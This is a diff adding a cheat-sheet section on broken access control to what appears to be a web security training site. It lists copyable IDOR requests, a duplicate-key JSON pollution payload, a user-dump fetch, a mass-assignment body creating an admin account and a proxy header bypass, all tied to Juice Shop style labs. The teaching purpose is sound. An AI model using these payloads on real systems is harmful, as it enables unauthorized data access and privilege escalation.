@@ -577,6 +577,105 @@
       </div>
     </section>
 
+    <!-- Category 3d: Broken Access Control (IDOR, BOLA, HPP & Mass Assignment) -->
+    <section class="cheat-section" id="broken-access-control">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">🔓</span>
+        <h2 class="cheat-section__title">Broken Access Control (IDOR, BOLA, HPP &amp; Mass Assignment)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:36%;">Request / One-Liner</th>
+              <th style="width:18%;">Technique</th>
+              <th style="width:36%;">What It Does</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>sessionStorage.bid = 1</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('sessionStorage.bid = 1')">Copy</button>
+                </div>
+              </td>
+              <td><strong>UI Basket IDOR</strong></td>
+              <td>Points Juice Shop's Angular frontend at Basket <span class="flag-pill">1</span> (Admin's cart). Reload <code>/#/basket</code> to render the Admin's items inside your customer session</td>
+              <td><a href="./labs/lab05.html#idor-live" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>GET /rest/basket/1</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('GET /rest/basket/1')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Horizontal IDOR (read)</strong></td>
+              <td>Fetches Basket <span class="flag-pill">1</span> directly via the REST API using a normal customer JWT because the server checks authentication but skips ownership</td>
+              <td><a href="./labs/lab05.html#idor-live" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>{"BasketId":3,"ProductId":6,"BasketId":2,"quantity":1}</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('{\"BasketId\":3,\"ProductId\":6,\"BasketId\":2,\"quantity\":1}')">Copy</button>
+                </div>
+              </td>
+              <td><strong>JSON Parameter Pollution (HPP)</strong></td>
+              <td>Sends <span class="flag-pill">BasketId</span> twice on <code>POST /api/BasketItems</code>: the guard checks the 1st key (your basket <code>3</code>) and the DB writes the last key (victim basket <code>2</code>)</td>
+              <td><a href="./labs/lab05.html#idor-live" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>fetch('/main.js').then(r=&gt;r.text()).then(t=&gt;console.log([...new Set(t.match(/\/(api|rest)\/[A-Za-z0-9_-]+/g))].sort()))</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('fetch(\'/main.js\').then(r=>r.text()).then(t=>console.log([...new Set(t.match(/\\/(api|rest)\\/[A-Za-z0-9_-]+/g))].sort()))')">Copy</button>
+                </div>
+              </td>
+              <td><strong>SPA Bundle API Recon</strong></td>
+              <td>Scans the downloaded <span class="flag-pill">/main.js</span> bundle and prints all 35 hidden <code>/api/</code> and <code>/rest/</code> endpoints in 1 second</td>
+              <td><a href="./labs/lab05.html#vertical-escalation" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>fetch('/api/Users', {headers:{Authorization:'Bearer '+localStorage.token}}).then(r=&gt;r.json()).then(d=&gt;console.table(d.data, ['id','email','role']))</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('fetch(\'/api/Users\', {headers:{Authorization:\'Bearer \'+localStorage.token}}).then(r=>r.json()).then(d=>console.table(d.data, [\'id\',\'email\',\'role\']))')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Vertical BOLA (dump users)</strong></td>
+              <td>Bypasses Angular's client-side <code>AdminGuard</code> and calls <span class="flag-pill">GET /api/Users</span> directly to print all user accounts and schema fields (<code>role</code>) in DevTools</td>
+              <td><a href="./labs/lab05.html#vertical-escalation" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>{"email":"pentester@juice-sh.op","password":"Password123","passwordRepeat":"Password123","role":"admin"}</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('{\"email\":\"pentester@juice-sh.op\",\"password\":\"Password123\",\"passwordRepeat\":\"Password123\",\"role\":\"admin\"}')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Mass Assignment (BOPLA)</strong></td>
+              <td>Mirrors <span class="flag-pill">"role":"admin"</span> (discovered in <code>GET /api/Users</code>) into <code>POST /api/Users</code> so Sequelize binds it and creates a full Admin account</td>
+              <td><a href="./labs/lab05.html#vertical-escalation" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>X-Original-URL: /admin/delete</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('X-Original-URL: /admin/delete')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Reverse-proxy path bypass</strong></td>
+              <td>Send <code>GET /?username=carlos</code> so the front-end proxy allows <code>/</code>, while the back-end framework routes to the path in <span class="flag-pill">X-Original-URL</span></td>
+              <td><a href="./labs/lab05.html#parser-hacks" class="badge-lab-ref">Lab 05</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
